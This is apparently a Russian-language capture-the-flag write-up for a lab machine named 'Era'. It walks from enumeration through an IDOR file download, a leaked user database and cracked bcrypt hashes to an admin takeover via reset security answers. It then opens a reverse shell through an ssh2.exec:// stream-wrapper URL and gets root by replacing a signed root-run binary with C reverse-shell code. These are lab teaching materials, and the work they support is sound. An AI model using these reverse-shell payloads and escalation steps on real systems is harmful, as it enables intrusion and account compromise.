Первым делом сканируем цель nmap:

```bash
nmap -sC -sV -Pn -p- 10.129.119.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 19:01 CDT
Nmap scan report for 10.129.119.222
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.20 seconds
```

Теперь посмотрим директории и сабдомены:

```bash
gobuster dir -u http://era.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://era.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/index.html           (Status: 200) [Size: 19493]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

ничего стоющего, идем дальше.

А вот с собдоменами пришлось поигратся, так как несколько сканов ничего не нашли:

```bash
gobuster vhost -u http://era.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://era.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

Gobuster не дал результатов, решил попробовать ffuf

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H  "Host: FUZZ.era.htb" -u http://era.htb -t 200 -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 101ms]
```

Если перейти по сслыке, то мы увидим сторедж сервис, где есть возможность загружать файлы:

![alt text](image.png)

Тут ниего интересного попробовал проверить форму логинга на SQL инекцию, не сработало.

Поэтому попробую просмотреть директории:

```bash
gobuster dir -u http://file.era.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 --exclude-length 6765 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/LICENSE              (Status: 200) [Size: 34524]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/layout.php           (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 9214]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 3205]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
Progress: 9446 / 9448 (99.98%)
===============================================================
Finished
===============================================================
```

Попробую зарегестрироваться.

Кстати интересный способ логинга:

![alt text](image-1.png)

Я попробовал зааплоудить файл и бинго:

![alt text](image-2.png)

У нас есть параметр id, еоторый монжо попробовать на IDOR.

Я решил попробовать брутфорс id параметра с помощю burp

![alt text](image-3.png)

Я загрузил в Intruder список с seclist

Есть два id:

![alt text](image-4.png)

Мне удалось скачать два файла и после распаковки:

```bash
ls 
bg.jpg                layout.php           screen-login.png
css                   LICENSE              screen-main.png
download.php          login.php            screen-manage.png
filedb.sqlite         logout.php           screen-upload.png
files                 main.png             security_login.php
functions.global.php  manage.php           signing.zip
index.php             register.php         site-backup-30-08-24.zip
initial_layout.php    reset.php            upload.php
key.pem               sass                 webfonts
layout_login.php      screen-download.png  x509.genkey
```

Вижу filedb.sqlite, делаю дамп:

```sql
sqlite3 filedb.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE files (
  fileid int NOT NULL PRIMARY KEY,
  filepath varchar(255) NOT NULL,
  fileowner int NOT NULL,
  filedate timestamp NOT NULL
  );
INSERT INTO files VALUES(54,'files/site-backup-30-08-24.zip',1,1725044282);
CREATE TABLE users (
  user_id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_name varchar(255) NOT NULL,
  user_password varchar(255) NOT NULL,
  auto_delete_files_after int NOT NULL
  , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));
INSERT INTO users VALUES(1,'admin_ef01cab31aa','$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC',600,'Maria','Oliver','Ottawa');
INSERT INTO users VALUES(2,'eric','$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(3,'veronica','$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(4,'yuri','$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(5,'john','$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(6,'ethan','$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC',-1,NULL,NULL,NULL);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',16);
COMMIT;
sqlite>
```

Мы видим несколько юзеров и хеши паролей, дальше думаю нужно кракнуть пароли hashcat:

``bash

echo 'yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.' > hash.txt
echo 'eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm' >> hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /home/wam0x0x0/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (eric)
mustang          (yuri)
2g 0:00:00:07 DONE (2025-08-28 21:12) 0.2621g/s 42.46p/s 61.33c/s 61.33C/s adidas..sweet
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

добывем два пароля, остольные взломать не удалось.

Вспоминаем, что у нас есть ftp сервер, пробуем логинится туда:

```bash
ftp 10.129.237.233
Connected to 10.129.237.233.
220 (vsFTPd 3.0.5)
Name (10.129.237.233:root): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46310|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK
```

Удалось, но особо полезной инфы там нет.

Теперь попробуем изучить файлы которые мы ранее получили путем скачивания с сайта.

Вот это интересный участок, из за ошибки в логике кода, мы можем получить SSRF уязвимость.
Как именно:

Логика разрешает запрашивать что либо, если в запросе есть ```://```, но только если ты дмин юзер, например, o connect to internal resources or execute commands via PHP stream wrappers like ssh2.exec://, without any checks. А админ юзера мы сможем получить, у нас есть его имя и возможность логина через секретные фразы, о чем я писал выше. А еще мы знаем, что мы можем ресетнуть эти фразы зная имя юзера.

![alt text](image-5.png)

Теперь логинимся через секюрити логин:

![alt text](image-6.png)

Теперь мы в аккаунте админа:

![alt text](image-7.png)

Теперь подготавливаем rce: http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F<YOUR_IP>%2F4444%200%3E%261%22;

ПОлучилось)

![alt text](image-8.png)


Теперь логинимся как eric пароль у нас есть.

```bash
yuri@era:/home$ su eric
su eric
Password: america
ls
eric
yuri
```

Нужно нормализировать shell: python3 -c 'import pty,os; os.putenv("TERM","xterm-256color"); pty.spawn("/bin/bash")'


Далее нужно получить root, для этого загружаю linpeas.sh

![alt text](image-9.png)

Запускаю и скрип и нахожу это:

```bash
Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group devs:
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

там бежит скрипт monitor, который выполняется в бекграунте от root, но с групой devкуда входит eri. Поэтому мы заменим этот файл на пелоад, который даст нам рут.

```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.129/1337 0>&1", NULL);
    return 0;
}
```

```bash
 unzip signing.zip
Archive:  signing.zip
  inflating: key.pem                 
  inflating: x509.genkey

x86_64-linux-gnu-gcc -o monitor exploit.c -static

file monitor
monitor: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26c7168121ab26f0da78b0bf19e2c0c4e70a8f91, for GNU/Linux 3.2.0, not stripped

git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
cd linux-elf-binary-signer/
make clean
gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
./elf-sign sha256 key.pem key.pem monitor
mv monitor monitor.1
```

Теперь запустим python server и скачаем наш експлойт на целевой хост.

```bash
python3 -m http.server 8000 --bind 10.10.14.129
```

На целевой:

```bash
/opt/AV/periodic-checks$ wget http://10.10.14.129:8000/monitor.1
eric@era:/opt/AV/periodic-checks$ ls
ls
monitor  monitor.1  status.log
eric@era:/opt/AV/periodic-checks$ rm monitor
rm monitor
eric@era:/opt/AV/periodic-checks$ mv monitor.1 monitor
mv monitor.1 monitor
eric@era:/opt/AV/periodic-checks$ chmod +x monitor
chmod +x monitor
eric@era:/opt/AV/periodic-checks$ ls -la
ls -la
total 764
drwxrwxr-- 2 root devs   4096 Aug 29 16:15 .
drwxrwxr-- 3 root devs   4096 Jul 22 08:42 ..
-rwxrwxr-x 1 eric eric 767264 Aug 29 16:15 monitor
-rw-rw---- 1 root devs    127 Aug 29 16:15 status.log
eric@era:/opt/AV/periodic-checks$
```

После запускаем на локальной машине nc и ждем, через пару секунд появится шелл рута:

``bash
nc -lnvp 1337 -s 10.10.14.129
listening on [10.10.14.129] 1337 ...
connect to [10.10.14.129] from (UNKNOWN) [10.129.132.226] 57410
bash: cannot set terminal process group (4991): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~#
```


